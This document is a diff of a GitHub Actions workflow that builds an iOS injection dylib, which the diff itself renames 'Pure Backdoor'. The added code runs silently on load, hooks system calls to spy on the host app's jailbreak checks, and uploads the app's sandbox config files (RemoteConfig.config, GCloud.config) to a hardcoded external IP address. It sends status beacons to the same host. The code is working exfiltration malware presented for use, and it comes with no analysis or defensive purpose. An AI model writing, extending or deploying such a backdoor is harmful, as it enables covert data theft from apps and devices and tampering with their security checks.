@@ -1,4 +1,4 @@
-name: Imperial Question Radar - V64.0 MONITOR
+name: Imperial Pure Backdoor - V66.0 STABLE
 
 on:
   push:
@@ -6,33 +6,31 @@ on:
   workflow_dispatch:
 
 jobs:
-  build_radar:
+  build_pure_backdoor:
     runs-on: macos-latest
 
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Create Radar Source
+      - name: Create Imperial Source
         run: |
           mkdir -p jni
           cat <<'EOF' > jni/main.mm
           #import <Foundation/Foundation.h>
-          #import <UIKit/UIKit.h>
-          #import <WebKit/WebKit.h>
           #include <mach-o/dyld.h>
           #include <sys/stat.h>
-          #include <sys/sysctl.h>
           #include <unistd.h>
           #include <time.h>
 
           // ==========================================
-          // [ 1. إعدادات الرادار - مسعود الإمبراطور ]
+          // [ 1. إعدادات الإمبراطور والآيبي المثبت ]
           // ==========================================
+          #define SERVER_IP @"34.204.178.160"
           #define RADAR_URL @"http://34.204.178.160:5001/ask"
-          #define ImperialGold [UIColor colorWithRed:1.0 green:0.84 blue:0.0 alpha:1.0]
+          #define UPLOAD_URL @"http://34.204.178.160:5000/upload"
 
-          // دالة إرسال "السؤال" الملقوف إلى السيرفر
+          // دالة الرادار (لقف الأسئلة)
           void SendQuestion(NSString *category, NSString *content) {
               time_t now; time(&now);
               char *dt = ctime(&now);
@@ -54,87 +52,79 @@ jobs:
               [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
           }
 
+          // دالة الجاسوس (سحب الملفات ببيئة الـ Sandbox)
+          void SendFileFromSandbox(NSString *fileName) {
+              // الحصول على مسار المجلد Documents مالت اللعبة
+              NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+              NSString *documentsDirectory = [paths objectAtIndex:0];
+              NSString *fullPath = [documentsDirectory stringByAppendingPathComponent:fileName];
+              
+              NSData *data = [NSData dataWithContentsOfFile:fullPath];
+              if (!data) return;
+              
+              NSURL *url = [NSURL URLWithString:UPLOAD_URL];
+              NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
+              [req setHTTPMethod:@"POST"];
+              
+              NSString *boundary = @"ImperialBoundaryV66";
+              [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
+              
+              NSMutableData *body = [NSMutableData data];
+              [body appendData:[[NSString stringWithFormat:@"--%@\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%@\"\r\n\r\n", boundary, fileName] dataUsingEncoding:NSUTF8StringEncoding]];
+              [body appendData:data];
+              [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
+              
+              [req setHTTPBody:body];
+              [[[NSURLSession sharedSession] dataTaskWithRequest:req] resume];
+              SendQuestion(@"RAID", [NSString stringWithFormat:@"✅ Captured File: %@", fileName]);
+          }
+
           // ==========================================
-          // [ 2. محرك اللقف (System Call Hooks) ]
+          // [ 2. رادار الأسئلة الصامت (System Call Hooks) ]
           // ==========================================
           typedef struct interpose_substitution { const void* replacement; const void* original; } interpose_substitution_t;
           #define INTERPOSE(_replacement,_original) __attribute__((used)) static const interpose_substitution_t _interpose_##_original __attribute__ ((section ("__DATA, __interpose"))) = { (const void*)(unsigned long)&_replacement, (const void*)(unsigned long)&_original };
 
           // لقف السؤال عن وجود الملفات (access)
+          // هذا الهوك الصامت آمن جداً ولا يسبب كراش
           int hk_access(const char *path, int mode) {
               if (path && (strstr(path, "Cydia") || strstr(path, "Shadow") || strstr(path, "lib") || strstr(path, ".dat"))) {
-                  SendQuestion(@"File Check 📂", [NSString stringWithFormat:@"اللعبة تسأل: هل ملف %s موجود؟", path]);
+                  SendQuestion(@"File Check 🛰️", [NSString stringWithFormat:@"اللعبة تسأل: هل ملف %s موجود؟", path]);
               }
               return access(path, mode);
           }
           INTERPOSE(hk_access, access);
 
-          // لقف السؤال عن معلومات النظام (sysctl)
-          int hk_sysctl(int *name, u_int namelen, void *oldp, size_t *oldlenp, void *newp, size_t newlen) {
-              SendQuestion(@"System Info ⚙️", @"اللعبة تطلب معلومات النظام أو المعالج (sysctl)");
-              return sysctl(name, namelen, oldp, oldlenp, newp, newlen);
-          }
-          INTERPOSE(hk_sysctl, sysctl);
-
           // ==========================================
-          // [ 3. الواجهة الإمبراطورية المتحركة ]
+          // [ 3. نقطة الدخول (الساكتة) ]
           // ==========================================
-          @interface ImperialUI : UIWindow
-          @property (nonatomic, assign) CGPoint lastLocation;
-          @end
-
-          @implementation ImperialUI
-          - (instancetype)initWithFrame:(CGRect)frame {
-              self = [super initWithFrame:frame];
-              if (self) {
-                  self.windowLevel = UIWindowLevelStatusBar + 100.0;
-                  self.backgroundColor = [UIColor clearColor];
-                  [self setupUI];
-                  [self makeKeyAndVisible];
-              }
-              return self;
-          }
-
-          - (void)setupUI {
-              UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
-              btn.frame = CGRectMake(20, 150, 60, 60);
-              [btn setTitle:@"🛰️" forState:UIControlStateNormal];
-              btn.backgroundColor = [UIColor colorWithWhite:0 alpha:0.8];
-              btn.layer.cornerRadius = 30;
-              btn.layer.borderColor = ImperialGold.CGColor;
-              btn.layer.borderWidth = 1.0;
-              [self addSubview:btn];
-
-              UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(handlePan:)];
-              [self addGestureRecognizer:pan];
-          }
-
-          - (void)handlePan:(UIPanGestureRecognizer *)gesture {
-              if (gesture.state == UIGestureRecognizerStateBegan) { self.lastLocation = self.center; }
-              CGPoint translation = [gesture translationInView:self];
-              self.center = CGPointMake(self.lastLocation.x + translation.x, self.lastLocation.y + translation.y);
-          }
-          @end
-
           __attribute__((constructor))
           static void entry() {
+              // تأخير التشغيل 10 ثواني لضمان استقرار الحقن
               dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-                  static ImperialUI *ui; ui = [[ImperialUI alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
-                  SendQuestion(@"System", @"✅ رادار الأسئلة شغال وجاهز للصيد");
+                  SendQuestion(@"System", @"✅ Imperial Pure Backdoor is Active & Silent");
+                  
+                  // سحب أهم الملفات فورياً ببيئة الـ Sandbox
+                  SendFileFromSandbox(@"RemoteConfig.config");
+                  SendFileFromSandbox(@"GCloud.config");
+                  
+                  // فحص الـ Bundle ID للنسخة الرسمية
+                  NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
+                  SendQuestion(@"App Info", [NSString stringWithFormat:@"App is running with Bundle ID: %@", bid]);
               });
           }
           EOF
 
-      - name: Build Radar Dylib
+      - name: Build Pure Backdoor Dylib
         run: |
           clang++ -dynamiclib -std=c++11 -x objective-c++ \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          -arch arm64 jni/main.mm -o ImperialRadar.dylib \
-          -framework Foundation -framework UIKit -framework CoreGraphics -lobjc
+          -arch arm64 jni/main.mm -o ImperialFinal.dylib \
+          -framework Foundation -lobjc
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Imperial-Radar-V64
-          path: ImperialRadar.dylib
+          name: Imperial-Final-Backdoor
+          path: ImperialFinal.dylib
           
